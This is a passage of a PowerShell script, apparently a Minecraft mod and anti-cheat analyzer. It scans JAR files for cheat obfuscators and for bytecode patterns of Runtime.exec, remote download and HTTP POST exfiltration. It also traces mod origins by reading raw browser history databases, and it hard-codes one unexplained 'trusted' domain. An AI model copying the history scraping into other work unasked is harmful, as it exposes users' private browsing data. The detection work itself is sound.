        if ($singleCharPkg -ge 6) { $flags.Add("Single-char package paths — $singleCharPkg path segments like a/b/c") }

        $fwStringMatches = [regex]::Matches($contentSample.ToString(), "[\uFF21-\uFF3A\uFF41-\uFF5A\uFF10-\uFF19]{2,}")
        if ($fwStringMatches.Count -gt 0) {
            $examples = ($fwStringMatches | Select-Object -First 3 | ForEach-Object { $_.Value }) -join ", "
            $flags.Add("Fullwidth strings in class content — $($fwStringMatches.Count) occurrences (e.g. $examples)")
        }

        $sampleStr = $contentSample.ToString()
        foreach ($obfName in $cheatObfuscators.Keys) {
            foreach ($pat in $cheatObfuscators[$obfName]) {
                if ($sampleStr.Contains($pat)) {
                    $flags.Add("Known cheat obfuscator detected — $obfName (matched: $pat)")
                    break
                }
            }
        }

    } catch { }

    return $flags
}

function Invoke-BypassScan {
    param([string]$FilePath)

    $flags = [System.Collections.Generic.List[string]]::new()

    $mavenPrefixes = @(
        "com_","org_","net_","io_","dev_","gs_","xyz_",
        "app_","me_","tv_","uk_","be_","fr_","de_"
    )

    function Test-SuspiciousJarName {
        param([string]$JarName)
        $base = [System.IO.Path]::GetFileNameWithoutExtension($JarName)
        if ($base -match '\d')                                          { return $false }
        foreach ($pfx in $mavenPrefixes) {
            if ($base.ToLower().StartsWith($pfx))                       { return $false }
        }
        if ($base.Length -gt 20)                                        { return $false }
        return $true
    }

    try {
        $zip = [System.IO.Compression.ZipFile]::OpenRead($FilePath)

        $nestedJars   = @($zip.Entries | Where-Object { $_.FullName -match "^META-INF/(jars|jarjar)/.+\.jar$" })
        $outerClasses = @($zip.Entries | Where-Object { $_.FullName -match "\.class$" })

        $suspiciousNestedJars = @()
        foreach ($nj in $nestedJars) {
            $njBase = [System.IO.Path]::GetFileName($nj.FullName)
            if (Test-SuspiciousJarName -JarName $njBase) {
                $suspiciousNestedJars += $njBase
            }
        }
        foreach ($sj in $suspiciousNestedJars) {
            $flags.Add("Suspicious nested JAR — no version, unknown dependency: $sj")
        }

        if ($nestedJars.Count -eq 1 -and $outerClasses.Count -lt 3) {
            $njName = [System.IO.Path]::GetFileName(($nestedJars | Select-Object -First 1).FullName)
            $flags.Add("Hollow shell — only $($outerClasses.Count) own class(es), wraps: $njName")
        }

        $outerModId = ""
        $fmje = $zip.Entries | Where-Object { $_.FullName -eq "fabric.mod.json" } | Select-Object -First 1
        if ($fmje) {
            try {
                $s = $fmje.Open()
                $r = New-Object System.IO.StreamReader($s)
                $t = $r.ReadToEnd(); $r.Close(); $s.Close()
                if ($t -match '"id"\s*:\s*"([^"]+)"') { $outerModId = $matches[1] }
            } catch { }
        }

        $allEntries    = [System.Collections.Generic.List[object]]::new()
        foreach ($e in $zip.Entries) { $allEntries.Add($e) }

        $innerZips = [System.Collections.Generic.List[object]]::new()
        foreach ($nj in $nestedJars) {
            try {
                $ns = $nj.Open()
                $ms = New-Object System.IO.MemoryStream
                $ns.CopyTo($ms); $ns.Close()
                $ms.Position = 0
                $iz = [System.IO.Compression.ZipArchive]::new($ms, [System.IO.Compression.ZipArchiveMode]::Read)
                $innerZips.Add($iz)
                foreach ($ie in $iz.Entries) { $allEntries.Add($ie) }
            } catch { }
        }

        $runtimeExecFound  = $false
        $httpDownloadFound = $false
        $httpExfilFound    = $false
        $obfuscatedCount   = 0
        $numericClassCount = 0
        $unicodeClassCount = 0
        $totalClassCount   = 0

        foreach ($entry in $allEntries) {
            $name = $entry.FullName

            if ($name -match "\.class$") {
                $totalClassCount++
                $className = [System.IO.Path]::GetFileNameWithoutExtension(($name -split "/")[-1])

                if ($className -match "^\d+$") { $numericClassCount++ }
                if ($className -match "[^\x00-\x7F]") { $unicodeClassCount++ }

                $segs = ($name -replace "\.class$","") -split "/"
                $consecutiveSingle = 0
                $maxConsecutive    = 0
                foreach ($seg in $segs) {
                    if ($seg.Length -eq 1) {
                        $consecutiveSingle++
                        if ($consecutiveSingle -gt $maxConsecutive) { $maxConsecutive = $consecutiveSingle }
                    } else {
                        $consecutiveSingle = 0
                    }
                }
                if ($maxConsecutive -ge 3) { $obfuscatedCount++ }

                if ($runtimeExecFound -and $httpDownloadFound -and $httpExfilFound) { continue }

                try {
                    $st = $entry.Open()
                    $ms2 = New-Object System.IO.MemoryStream
                    $st.CopyTo($ms2)
                    $st.Close()
                    $rawBytes = $ms2.ToArray()
                    $ms2.Dispose()
                    $ct = [System.Text.Encoding]::ASCII.GetString($rawBytes)

                    if (-not $runtimeExecFound -and
                        $ct -match "java/lang/Runtime" -and
                        $ct -match "getRuntime" -and
                        $ct -match "exec") {
                        $runtimeExecFound = $true
                    }

                    if (-not $httpDownloadFound -and
                        $ct -match "openConnection" -and
                        $ct -match "HttpURLConnection" -and
                        $ct -match "FileOutputStream") {
                        $httpDownloadFound = $true
                    }

                    if (-not $httpExfilFound -and
                        $ct -match "openConnection" -and
                        $ct -match "setDoOutput" -and
                        $ct -match "getOutputStream" -and
                        $ct -match "getProperty") {
                        $httpExfilFound = $true
                    }

                } catch { }
            }
        }

        foreach ($iz in $innerZips) { try { $iz.Dispose() } catch { } }
        $zip.Dispose()

        $obfPct = if ($totalClassCount -ge 10) { [math]::Round(($obfuscatedCount   / $totalClassCount) * 100) } else { 0 }
        $numPct = if ($totalClassCount -ge 5)  { [math]::Round(($numericClassCount / $totalClassCount) * 100) } else { 0 }
        $uniPct = if ($totalClassCount -ge 5)  { [math]::Round(($unicodeClassCount / $totalClassCount) * 100) } else { 0 }

        if ($runtimeExecFound -and $obfPct -ge 25) {
            $flags.Add("Runtime.exec() in obfuscated code — can run arbitrary OS commands")
        }
        if ($httpDownloadFound) {
            $flags.Add("HTTP file download — fetches and writes files from a remote server at runtime")
        }
        if ($httpExfilFound) {
            $flags.Add("HTTP POST exfiltration — sends system data to an external server")
        }
        if ($totalClassCount -ge 10 -and $obfPct -ge 25) {
            $flags.Add("Heavy obfuscation — $obfPct% of classes use single-letter path segments (a/b/c style)")
        }
        if ($numPct -ge 20) {
            $flags.Add("Numeric class names — $numPct% of classes have numeric-only names (e.g. 1234.class)")
        }
        if ($uniPct -ge 10) {
            $flags.Add("Unicode class names — $uniPct% of classes use non-ASCII characters")
        }

        $knownLegitModIds = @(
            "vmp-fabric","vmp","lithium","sodium","iris","fabric-api",
            "modmenu","ferrite-core","lazydfu","starlight","entityculling",
            "memoryleakfix","krypton","c2me-fabric","smoothboot-fabric",
            "immediatelyfast","noisium","threadtweak"
        )
        $dangerCount = ($flags | Where-Object {
            $_ -match "Runtime\.exec|HTTP file download|HTTP POST|Heavy obfuscation|Suspicious nested JAR"
        }).Count
        if ($outerModId -and ($knownLegitModIds -contains $outerModId) -and $dangerCount -gt 0) {
            $flags.Add("Fake mod identity — claims to be '$outerModId' but contains dangerous code")
        }

    } catch { }

    return $flags
}
'@

$spinnerFrames = @("⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷")

function Invoke-Parallel {
    param(
        [object[]]$Items,
        [scriptblock]$Worker,
        $Shared,
        [string]$Label = "Working"
    )

    $results = New-Object object[] $Items.Count
    if ($Items.Count -eq 0) { return ,$results }

    $threads = [Math]::Max(2, [Math]::Min(16, [Environment]::ProcessorCount]))
    $pool = [runspacefactory]::CreateRunspacePool(1, $threads)
    $pool.Open()

    $jobs = [System.Collections.Generic.List[object]]::new()
    for ($i = 0; $i -lt $Items.Count; $i++) {
        $ps = [powershell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($Worker).AddArgument($Items[$i]).AddArgument($Shared)
        $jobs.Add(@{ PS = $ps; Handle = $ps.BeginInvoke(); Index = $i })
    }

    $tick = 0
    while ($true) {
        $done = 0
        foreach ($j in $jobs) { if ($j.Handle.IsCompleted) { $done++ } }
        $spinner = $spinnerFrames[$tick % $spinnerFrames.Length]
        Write-Host "`r[$spinner] $($Label): $done/$($Items.Count)" -ForegroundColor Yellow -NoNewline
        if ($done -ge $jobs.Count) { break }
        $tick++
        Start-Sleep -Milliseconds 60
    }

    foreach ($j in $jobs) {
        $failMsg = $null
        try {
            $out = $j.PS.EndInvoke($j.Handle)
            $results[$j.Index] = $out | Select-Object -Last 1
        } catch {
            $failMsg = $_.Exception.Message
            if ($_.Exception.InnerException) { $failMsg = $_.Exception.InnerException.Message }
        }
        if (-not $failMsg -and $null -eq $results[$j.Index] -and $j.PS.Streams.Error.Count -gt 0) {
            $failMsg = $j.PS.Streams.Error[0].ToString()
        }
        if ($failMsg) {
            $results[$j.Index] = [PSCustomObject]@{ Failed = $true; Error = $failMsg }
        }
        try { $j.PS.Dispose() } catch { }
    }
    try { $pool.Close(); $pool.Dispose() } catch { }

    Write-Host "`r$(' ' * 100)`r" -NoNewline
    return ,$results
}

$scanWorker = {
    param($item, $shared)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        . ([scriptblock]::Create($shared.Code))

        $patternRegex   = $shared.PatternRegex
        $fullwidthRegex = $shared.FullwidthRegex
        $cheatAscii     = $shared.CheatAscii
        $cheatWide      = $shared.CheatWide
        $fwCheatPool    = $shared.FwPool

        $res = [PSCustomObject]@{ Name = $item.Name; Mod = $null; Bypass = @(); Obf = @() }

        switch ($item.Kind) {
            'mod'    { $res.Mod    = Invoke-ModScan -FilePath $item.Path }
            'bypass' { $res.Bypass = @(Invoke-BypassScan -FilePath $item.Path) }
            'obf'    { $res.Obf    = @(Invoke-ObfuscationScan -FilePath $item.Path) }
            default {
                if (-not $item.SkipDeep) {
                    $res.Mod    = Invoke-ModScan -FilePath $item.Path
                    $res.Bypass = @(Invoke-BypassScan -FilePath $item.Path)
                }
                if (-not $item.SkipObf) { $res.Obf = @(Invoke-ObfuscationScan -FilePath $item.Path) }
            }
        }
        $res
    } catch {
        [PSCustomObject]@{ Name = $item.Name; Failed = $true; Error = $_.Exception.Message }
    }
}

# Runs mod / bypass / obfuscation scans as separate parallel jobs (biggest files first) and merges them per jar
function Invoke-ScanParallel {
    param([object[]]$Items, [string]$Label = "Scanning (parallel)")
    $results = New-Object object[] $Items.Count
    if ($Items.Count -eq 0) { return ,$results }

    $jobs = [System.Collections.Generic.List[object]]::new()
    for ($i = 0; $i -lt $Items.Count; $i++) {
        $it = $Items[$i]
        $results[$i] = [PSCustomObject]@{ Name = $it.Name; Mod = $null; Bypass = @(); Obf = @() }
        $size = 0
        try { $size = (Get-Item -LiteralPath $it.Path -ErrorAction Stop).Length } catch { }
        if (-not $it.SkipDeep) {
            $jobs.Add(@{ Path = $it.Path; Name = $it.Name; Kind = 'mod';    Idx = $i; Size = $size })
            $jobs.Add(@{ Path = $it.Path; Name = $it.Name; Kind = 'bypass'; Idx = $i; Size = $size })
        }
        if (-not $it.SkipObf) {
            $jobs.Add(@{ Path = $it.Path; Name = $it.Name; Kind = 'obf';    Idx = $i; Size = $size })
        }
    }
    if ($jobs.Count -eq 0) { return ,$results }

    $ordered = @($jobs | Sort-Object { $_.Size } -Descending)
    $jr = Invoke-Parallel -Items $ordered -Worker $scanWorker -Shared $shared -Label $Label

    for ($k = 0; $k -lt $ordered.Count; $k++) {
        $job = $ordered[$k]
        $i   = $job.Idx
        if ($results[$i].Failed) { continue }
        $r = $jr[$k]
        if (-not $r -or $r.Failed) {
            $msg = if ($r -and $r.Error) { $r.Error } else { "no result returned" }
            $results[$i] = [PSCustomObject]@{ Failed = $true; Error = $msg }
            continue
        }
        switch ($job.Kind) {
            'mod'    { $results[$i].Mod    = $r.Mod }
            'bypass' { $results[$i].Bypass = @($r.Bypass) }
            'obf'    { $results[$i].Obf    = @($r.Obf) }
        }
    }
    return ,$results
}

$megaWorker = {
    param($item, $shared)
    try {
        $r = Invoke-RestMethod -Uri "https://megabase.vercel.app/api/query?hash=$($item.Hash)" -Method Get -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
        if (-not $r.error) { return $r.data }
    } catch { }
    return $null
}

function Get-FileSHA1 {
    param([string]$Path)
    try {
        $sha = [System.Security.Cryptography.SHA1]::Create()
        $fs  = [System.IO.File]::OpenRead($Path)
        try { $bytes = $sha.ComputeHash($fs) } finally { $fs.Dispose(); $sha.Dispose() }
        return ([BitConverter]::ToString($bytes) -replace '-', '').ToLower()
    } catch { return $null }
}

function Get-HostFromUrl {
    param([string]$Url)
    if ([string]::IsNullOrWhiteSpace($Url)) { return $null }
    $Url = $Url.Trim()
    try {
        $u = [System.Uri]$Url
        if ($u.Host) { return ($u.Host -replace '^www\.', '') }
    } catch { }
    if ($Url -match '^(?:[a-zA-Z][a-zA-Z0-9+.\-]*://)?(?:www\.)?([^/:?#\s]+\.[^/:?#\s]+)') { return $matches[1] }
    return $null
}

$SourceSites = @{
    "mediafire.com"           = "MediaFire"
    "discord.com"             = "Discord"
    "discordapp.com"          = "Discord"
    "discordapp.net"          = "Discord"
    "discord.gg"              = "Discord"
    "dropbox.com"             = "Dropbox"
    "dropboxusercontent.com"  = "Dropbox"
    "drive.google.com"        = "Google Drive"
    "drive.usercontent.google.com" = "Google Drive"
    "docs.google.com"         = "Google Drive"
    "mega.nz"                 = "MEGA"
    "mega.co.nz"              = "MEGA"
    "mega.io"                 = "MEGA"
    "github.com"              = "GitHub"
    "githubusercontent.com"   = "GitHub"
    "gitlab.com"              = "GitLab"
    "modrinth.com"            = "Modrinth"
    "curseforge.com"          = "CurseForge"
    "forgecdn.net"            = "CurseForge"
    "planetminecraft.com"     = "Planet Minecraft"
    "sourceforge.net"         = "SourceForge"
    "gofile.io"               = "GoFile"
    "pixeldrain.com"          = "Pixeldrain"
    "catbox.moe"              = "Catbox"
    "workupload.com"          = "Workupload"
    "sendspace.com"           = "Sendspace"
    "transfer.sh"             = "transfer.sh"
    "file.io"                 = "file.io"
    "1drv.ms"                 = "OneDrive"
    "onedrive.live.com"       = "OneDrive"
    "sharepoint.com"          = "OneDrive"
    "telegram.org"            = "Telegram"
    "telegram.me"             = "Telegram"
    "t.me"                    = "Telegram"
    "telesco.pe"              = "Telegram"
    "youtube.com"             = "YouTube"
    "youtu.be"                = "YouTube"
    "vk.com"                  = "VK"
    "reddit.com"              = "Reddit"
    "archive.org"             = "Internet Archive"
    "anydesk.com"             = "AnyDesk"
    "doomsdayclient.com"      = "DoomsdayClient"
    "prestigeclient.vip"      = "PrestigeClient"
    "198macros.com"           = "198Macros"
    "dqrkis.xyz"              = "Dqrkis"
    "baulooprac.xyz"          = "BauloopRac"
}

function Get-SiteLabel {
    param([string]$HostName)
    if ([string]::IsNullOrWhiteSpace($HostName)) { return $null }
    $h = $HostName.ToLower()
    foreach ($k in $SourceSites.Keys) {
        if ($h -eq $k -or $h.EndsWith(".$k")) { return $SourceSites[$k] }
    }
    return $null
}

function Limit-Text {
    param([string]$Text, [int]$Max = 90)
    if ($Text.Length -gt $Max) { return $Text.Substring(0, $Max - 3) + "..." }
    return $Text
}

function Get-DownloadInfo {
    param([string]$Path)

    $zoneData = $null
    try { $zoneData = Get-Content -Raw -Stream Zone.Identifier -LiteralPath $Path -ErrorAction Stop } catch { }
    if (-not $zoneData) { return $null }

    $zoneId = $null; $hostUrl = $null; $refUrl = $null
    if ($zoneData -match "(?m)^ZoneId=(\d+)")     { $zoneId  = [int]$matches[1] }
    if ($zoneData -match "(?m)^HostUrl=(.+)$")     { $hostUrl = $matches[1].Trim() }
    if ($zoneData -match "(?m)^ReferrerUrl=(.+)$") { $refUrl  = $matches[1].Trim() }

    $hostName = Get-HostFromUrl $hostUrl
    $refName  = Get-HostFromUrl $refUrl

    $label = Get-SiteLabel $hostName
    if (-not $label) { $label = Get-SiteLabel $refName }
    if (-not $label) {
        if     ($hostName)      { $label = $hostName }
        elseif ($refName)       { $label = $refName }
        elseif ($zoneId -eq 3)  { $label = "Internet (URL not saved)" }
        else                    { $label = "Unknown origin" }
    }

    $via = $null
    if ($refName -and $refName -ne $hostName) {
        $refLabel = Get-SiteLabel $refName
        if (-not $refLabel) { $refLabel = $refName }
        if ($refLabel -ne $label) { $via = $refLabel }
    }
    $display = if ($via) { "$label (via $via)" } else { $label }

    return [PSCustomObject]@{
        Display     = $display
        Label       = $label
        HostUrl     = $hostUrl
        ReferrerUrl = $refUrl
        ZoneId      = $zoneId
        Method      = "Zone.Identifier"
        MoreUrls    = @()
    }
}

$trustedSourceDomains = @("baulooprac.xyz")

function Test-TrustedSource {
    param([string]$Path)
    $info = Get-DownloadInfo -Path $Path
    if (-not $info) { return $false }
    foreach ($u in @($info.HostUrl, $info.ReferrerUrl)) {
        $hn = Get-HostFromUrl $u
        if (-not $hn) { continue }
        $hn = $hn.ToLower()
        foreach ($d in $trustedSourceDomains) {
            if ($hn -eq $d -or $hn.EndsWith(".$d")) { return $true }
        }
    }
    return $false
}

function New-SourceInfo {
    param([string[]]$Urls, [string]$Method)
    $labels = [System.Collections.Generic.List[string]]::new()
    $clean  = @($Urls | Where-Object { $_ })
    foreach ($u in $clean) {
        $h = Get-HostFromUrl $u
        $l = Get-SiteLabel $h
        if (-not $l) { $l = $h }
        if ($l -and -not $labels.Contains($l)) { $labels.Add($l) }
    }
    $display = if ($labels.Count -gt 0) { (@($labels) | Select-Object -First 3) -join ", " } else { "Unknown origin" }
    return [PSCustomObject]@{
        Display     = $display
        Method      = $Method
        HostUrl     = ($clean | Select-Object -First 1)
        ReferrerUrl = $null
        MoreUrls    = @($clean | Select-Object -Skip 1 -First 2)
    }
}

function Get-BrowserHistoryFiles {
    $local = $env:LOCALAPPDATA
    $roam  = $env:APPDATA
    $roots = @(
        @{ Name = "Chrome";   Path = "$local\Google\Chrome\User Data" },
        @{ Name = "Edge";     Path = "$local\Microsoft\Edge\User Data" },
        @{ Name = "Brave";    Path = "$local\BraveSoftware\Brave-Browser\User Data" },
        @{ Name = "Vivaldi";  Path = "$local\Vivaldi\User Data" },
        @{ Name = "Opera";    Path = "$roam\Opera Software\Opera Stable" },
        @{ Name = "Opera GX"; Path = "$roam\Opera Software\Opera GX Stable" }
    )
    $files = [System.Collections.Generic.List[object]]::new()
    foreach ($r in $roots) {
        if (-not (Test-Path -LiteralPath $r.Path -PathType Container)) { continue }
        $direct = Join-Path $r.Path "History"
        if (Test-Path -LiteralPath $direct -PathType Leaf) {
            $files.Add([PSCustomObject]@{ Browser = $r.Name; Path = $direct })
        }
        foreach ($d in @(Get-ChildItem -LiteralPath $r.Path -Directory -ErrorAction SilentlyContinue |
                         Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" })) {
            $h = Join-Path $d.FullName "History"
            if (Test-Path -LiteralPath $h -PathType Leaf) {
                $files.Add([PSCustomObject]@{ Browser = $r.Name; Path = $h })
            }
        }
    }
    $ffRoot = "$roam\Mozilla\Firefox\Profiles"
    if (Test-Path -LiteralPath $ffRoot -PathType Container) {
        foreach ($d in @(Get-ChildItem -LiteralPath $ffRoot -Directory -ErrorAction SilentlyContinue)) {
            $pl = Join-Path $d.FullName "places.sqlite"
            if (Test-Path -LiteralPath $pl -PathType Leaf) {
                $files.Add([PSCustomObject]@{ Browser = "Firefox"; Path = $pl })
            }
        }
    }
    return $files
}

function Find-UrlsForFile {
    param([string]$Text, [string]$FileName, [int]$Max = 5)

    $urls    = [System.Collections.Generic.List[string]]::new()
    $needles = @($FileName)
    $esc = [uri]::EscapeDataString($FileName)
    if ($esc -ne $FileName) { $needles += $esc }

    foreach ($needle in $needles) {
        $pos = 0
        while ($urls.Count -lt $Max) {
            $i = $Text.IndexOf($needle, $pos, [System.StringComparison]::OrdinalIgnoreCase)
            if ($i -lt 1) { break }
            $pos = $i + $needle.Length

            if ($Text[$i - 1] -ne '/') { continue }

            $endPos = $i + $needle.Length
            if ($endPos -lt $Text.Length) {
                $nx = [int]$Text[$endPos]
                if ($nx -ge 33 -and $nx -le 126 -and $nx -ne 63 -and $nx -ne 35 -and $nx -ne 38) { continue }
            }

            $startLimit = [Math]::Max(0, $i - 600)
            $seg = $Text.Substring($startLimit, $i - $startLimit)
            $hs  = [Math]::Max($seg.LastIndexOf("https://"), $seg.LastIndexOf("http://"))
            if ($hs -lt 0) { continue }

            $urlStart = $startLimit + $hs
            $mid = $Text.Substring($urlStart, $i - $urlStart)
            if ($mid -match '[^\x21-\x7E]') { continue }

            $j = $endPos
            $limit = [Math]::Min($Text.Length, $endPos + 300)
            while ($j -lt $limit) {
                $c = [int]$Text[$j]
                if ($c -lt 33 -or $c -gt 126) { break }
                $j++
            }
            $url = $Text.Substring($urlStart, $j - $urlStart)
            if (-not $urls.Contains($url)) { $urls.Add($url) }
        }
    }
    return @($urls)
}

function Find-BrowserHistoryUrls {
    param([string[]]$Names)

    $found = @{}
    foreach ($n in $Names) { $found[$n] = [System.Collections.Generic.List[object]]::new() }
    if ($Names.Count -eq 0) { return $found }

    $enc = [System.Text.Encoding]::GetEncoding(28591)
    foreach ($h in (Get-BrowserHistoryFiles)) {
        $paths = @($h.Path)
        if ($h.Path -like "*places.sqlite") { $paths += ($h.Path + "-wal") }
        foreach ($pth in $paths) {
            if (-not (Test-Path -LiteralPath $pth -PathType Leaf)) { continue }
            $bytes = Read-FileShared -Path $pth
            if (-not $bytes) { continue }
            $text  = $enc.GetString($bytes)
            $bytes = $null
            foreach ($n in $Names) {
                foreach ($u in (Find-UrlsForFile -Text $text -FileName $n)) {
                    $found[$n].Add([PSCustomObject]@{ Browser = $h.Browser; Url = $u })
                }
            }
            $text = $null
        }
    }
    return $found
}

function Get-LauncherSources {
    param([string]$ModsPath)

    $map    = @{}
    $parent = $null
    try { $parent = [System.IO.Path]::GetDirectoryName($ModsPath.TrimEnd('\','/')) } catch { }

    if ($parent) {
        $cf = Join-Path $parent "minecraftinstance.json"
        if (Test-Path -LiteralPath $cf -PathType Leaf) {
            try {
                Add-Type -AssemblyName System.Web.Extensions
                $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
                $ser.MaxJsonLength = [int]::MaxValue
                $j = $ser.DeserializeObject([System.IO.File]::ReadAllText($cf))
                foreach ($a in @($j["installedAddons"])) {
                    $fn  = $a["fileNameOnDisk"]
                    $url = $null
                    $f   = $a["installedFile"]
                    if ($f) {
                        if (-not $fn) { $fn = $f["fileName"] }
                        $url = $f["downloadUrl"]
                    }
                    $id = $a["addonID"]
                    if (-not $url -and $id) { $url = "https://www.curseforge.com/projects/$id" }
                    if ($fn -and $url) {
                        $map[([string]$fn).ToLower()] = @{ Url = [string]$url; Method = "CurseForge instance data" }
                    }
                }
            } catch { }
        }
    }

    $dirs = @((Join-Path $ModsPath ".index"))
    if ($parent) { $dirs += (Join-Path $parent ".index") }
    foreach ($dir in $dirs) {
        if (-not (Test-Path -LiteralPath $dir -PathType Container)) { continue }
        foreach ($f in @(Get-ChildItem -LiteralPath $dir -Filter *.pw.toml -ErrorAction SilentlyContinue)) {
            try {
                $t = [System.IO.File]::ReadAllText($f.FullName)
                if ($t -match '(?m)^\s*filename\s*=\s*"([^"]+)"') { $fn = $matches[1] } else { continue }
                $url = $null
                if     ($t -match '(?s)\[download\].*?\burl\s*=\s*"([^"]+)"') { $url = $matches[1] }
                elseif ($t -match '(?m)^\s*mod-id\s*=\s*"([^"]+)"')           { $url = "https://modrinth.com/mod/$($matches[1])" }
                elseif ($t -match '(?m)^\s*project-id\s*=\s*(\d+)')           { $url = "https://www.curseforge.com/projects/$($matches[1])" }
                if ($url) { $map[$fn.ToLower()] = @{ Url = $url; Method = "Launcher index (.pw.toml)" } }
            } catch { }
        }
    }
    return $map
}

function Resolve-UnknownSources {
    param($Unknown, [string]$ModsPath)

    $result  = @{}
    $pending = [System.Collections.Generic.List[string]]::new()

    foreach ($mod in $Unknown) {
        $info = Get-DownloadInfo -Path $mod.FilePath
        if ($info) { $result[$mod.FileName] = $info } else { $pending.Add($mod.FileName) }
    }

    if ($pending.Count -gt 0) {
        $lm = Get-LauncherSources -ModsPath $ModsPath
        foreach ($n in @($pending)) {
            $k = $n.ToLower()
            if ($lm.ContainsKey($k)) {
                $result[$n] = New-SourceInfo -Urls @($lm[$k].Url) -Method $lm[$k].Method
                [void]$pending.Remove($n)
            }
        }
    }

    if ($pending.Count -gt 0) {
        $hist = Find-BrowserHistoryUrls -Names @($pending)
        foreach ($n in @($pending)) {
            $hits = @($hist[$n])
            if ($hits.Count -gt 0) {
                $urls     = @($hits | ForEach-Object { $_.Url } | Select-Object -Unique)
                $browsers = (@($hits | ForEach-Object { $_.Browser } | Select-Object -Unique)) -join ", "
                $result[$n] = New-SourceInfo -Urls $urls -Method "Browser history ($browsers)"
            }
        }
    }
    return $result
}

function Get-ModrinthBulk {
    param([string[]]$Hashes)

    $map = @{}
    if (-not $Hashes -or $Hashes.Count -eq 0) { return $map }
    $headers = @{ "User-Agent" = "MeowModAnalyzer/2.0" }

    try {
        $body = '{"hashes":[' + (($Hashes | ForEach-Object { '"' + $_ + '"' }) -join ',') + '],"algorithm":"sha1"}'
        $versions = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/version_files" -Method Post -Body $body `
            -ContentType "application/json" -Headers $headers -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
    } catch { return $map }

    $hashToProject = @{}
    foreach ($p in $versions.PSObject.Properties) {
        if ($p.Value.project_id) { $hashToProject[$p.Name.ToLower()] = $p.Value.project_id }
    }
    if ($hashToProject.Count -eq 0) { return $map }

    $projectIds = @($hashToProject.Values | Select-Object -Unique)
    $projects = @{}
    for ($i = 0; $i -lt $projectIds.Count; $i += 100) {
        $chunk = $projectIds[$i..([Math]::Min($i + 99, $projectIds.Count - 1))]
        $idsJson = '[' + (($chunk | ForEach-Object { '"' + $_ + '"' }) -join ',') + ']'
        try {
            $resp = Invoke-RestMethod -Uri ("https://api.modrinth.com/v2/projects?ids=" + [uri]::EscapeDataString($idsJson)) `
                -Method Get -Headers $headers -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            foreach ($pr in @($resp)) { $projects[$pr.id] = $pr }
        } catch { }
    }

    foreach ($h in $hashToProject.Keys) {
        $pid2 = $hashToProject[$h]
        if ($projects.ContainsKey($pid2)) {
            $pr = $projects[$pid2]
            $map[$h] = @{ Id = $pr.id; Name = $pr.title; Slug = $pr.slug; Downloads = $pr.downloads }
        }
    }
    return $map
}

function Get-ModrinthUserProjectIds {
    param([string]$User)
    $ids = [System.Collections.Generic.HashSet[string]]::new()
    try {
        $resp = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/user/$User/projects" -Method Get `
            -Headers @{ "User-Agent" = "MeowModAnalyzer/2.0" } -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
        foreach ($pr in @($resp)) { if ($pr.id) { [void]$ids.Add([string]$pr.id) } }
    } catch { }
    return ,$ids
}

function Split-JvmArgs {
    param([string]$Cmd)
    $out = [System.Collections.Generic.List[string]]::new()
    $cur = $null
    foreach ($tm in [regex]::Matches($Cmd, '(?:[^\s"]+|"[^"]*")+')) {
        $t = $tm.Value
        if ($t.StartsWith('-')) {
            if ($null -ne $cur) { $out.Add($cur) }
            $cur = $t
        } elseif ($null -ne $cur -and $cur -match '^(--[A-Za-z][\w.\-]*|-cp|-classpath|-jar|-p)$') {
            $out.Add("$cur $t")
            $cur = $null
        } else {
            if ($null -ne $cur) { $out.Add($cur); $cur = $null }
            $out.Add($t)
        }
    }
    if ($null -ne $cur) { $out.Add($cur) }
    return @($out)
}

function Write-Wrapped {
    param([string]$Text, [int]$Indent = 6, [ConsoleColor]$Color = 'White', [switch]$Inline)
    $w = 120
    try { $w = $Host.UI.RawUI.WindowSize.Width } catch { }
    if ($w -lt 40) { $w = 120 }
    $chunk = [Math]::Max(20, $w - $Indent - 2)
    $pad = ' ' * $Indent
    for ($i = 0; $i -lt $Text.Length; $i += $chunk) {
        $len = [Math]::Min($chunk, $Text.Length - $i)
        $line = $Text.Substring($i, $len)
        if ($i -eq 0 -and $Inline) { Write-Host $line -ForegroundColor $Color }
        else { Write-Host ($pad + $line) -ForegroundColor $Color }
    }
    if ($Text.Length -eq 0) { Write-Host "" }
}

function Read-YesNo {
    param([string]$Question)
    while ($true) {
        $a = (Read-Host $Question).Trim()
        if ($a -match '^(y|yes|s|si|sì)$') { return $true }
        if ($a -match '^(n|no)$')          { return $false }
        Write-Host "  Please answer Y or N." -ForegroundColor DarkYellow
    }
}

function Get-TextHits {
    param([string]$Text)
    $hits = [System.Collections.Generic.HashSet[string]]::new()
    foreach ($m in $patternRegex.Matches($Text)) { [void]$hits.Add($m.Value) }
    foreach ($s in $cheatAscii) { if ($Text.Contains($s)) { [void]$hits.Add($s) } }
    foreach ($s in $cheatWide)  { if ($Text.Contains($s)) { [void]$hits.Add($s) } }
    return @($hits | Sort-Object)
}

function Get-MinecraftJavaTargets {
    $list = [System.Collections.Generic.List[object]]::new()
    foreach ($p in (Get-JavaProcesses)) {
        $raw = Get-ProcessCommandLine -ProcId $p.ProcessId -Known $p.CommandLine
        $cmd = $null
        if ($raw) {
            $cmd = Expand-ArgFiles -Cmd $raw
            if ($cmd -notmatch $script:McMarkers) { continue }
        }
        $list.Add([PSCustomObject]@{
            Pid     = [int]$p.ProcessId
            Name    = $p.Name
            Start   = $p.CreationDate
            Cmd     = $cmd
            Version = $(if ($cmd) { Get-ArgValue -Cmd $cmd -Name '--version' })
            GameDir = $(if ($cmd) { Get-ArgValue -Cmd $cmd -Name '--gameDir' })
        })
    }
    return @($list | Sort-Object Start -Descending)
}

function Select-JavaTargets {
    $t = @(Get-MinecraftJavaTargets)
    if ($t.Count -eq 0) {
        Write-Host "  No running Minecraft/Java process found." -ForegroundColor DarkYellow
        return @()
    }
    if ($t.Count -eq 1) {
        Write-Host "  Using $($t[0].Name) PID $($t[0].Pid)" -ForegroundColor Green
        return $t
    }
    Write-Host "  Multiple Minecraft instances found:" -ForegroundColor Yellow
    for ($i = 0; $i -lt $t.Count; $i++) {
        $x   = $t[$i]
